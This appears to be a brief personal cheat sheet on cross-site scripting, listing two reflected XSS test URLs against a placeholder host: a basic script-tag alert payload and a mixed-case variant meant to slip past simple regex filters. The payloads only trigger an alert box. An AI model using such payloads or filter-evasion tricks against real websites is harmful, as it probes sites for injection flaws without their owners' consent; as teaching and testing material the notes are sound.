*************** XSS ***************

1. Basic payload:
- http://test.com/index.php?name=hacker<script>alert('txt')</script>

2. If webdeveloper did some regex to prevent simply XSS, you can try: 
- http://test.com/index.php?name=hacker<scRipt>alert('txt')</scriPt>
